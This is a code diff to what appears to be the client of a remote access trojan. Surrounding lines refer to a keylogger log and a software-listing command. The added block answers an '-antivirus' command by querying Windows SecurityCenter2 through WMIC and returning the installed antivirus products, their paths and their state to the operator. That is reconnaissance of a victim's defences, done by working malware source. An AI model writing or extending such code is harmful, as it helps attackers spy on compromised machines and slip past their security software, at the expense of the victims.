@@ -753,6 +753,34 @@ class Client:
                 response = '\nHas not possible to open the keylogger log.\n'
                 time.sleep(2)
                 return response
+        elif '-antivirus' in command:
+            if 'windows' in str(platform.platform()).lower():
+                try:
+                    path = r'/Namespace:\\root\SecurityCenter2'
+                    ant = 'AntiVirusProduct'
+                    clean = f'[@%HOST_SHELL%@]'
+                    collected = subprocess.check_output(['wmic', r'{}'.format(path), 'path', ant, 'get', r'/value'])
+                    analyzing = str(collected)
+                    if r"b'\r\r\n\r\r\n\r\r\n" in analyzing:
+                        clean += 'No Instance(s) Avaliable.'
+                    else:
+                        analyzing = analyzing.replace(r'\r\r\n', '    ')
+                        analyzing = analyzing.split('    ')
+                        for x in analyzing:
+                            if 'displayName' in x or 'pathToSignedProductExe' in x or 'pathToSignedReportingExe' in x or 'productState' in x or'timestamp' in x:
+                                x = x.replace('\\\\', '\\')
+                                splipted = x.split('=')
+                                if 'displayName' in x:
+                                    clean += '=-' * 50 + '\n'
+                                    clean += splipted[1] + '\n'
+                                else:
+                                    clean += '\t - ' + x + '\n'
+
+                    return clean
+                except:
+                    return 'error'
+            else:
+                return 'not windows'
 
         elif '@%list-softwares%@' in command:
             if 'windows' in str(platform.platform()).lower():
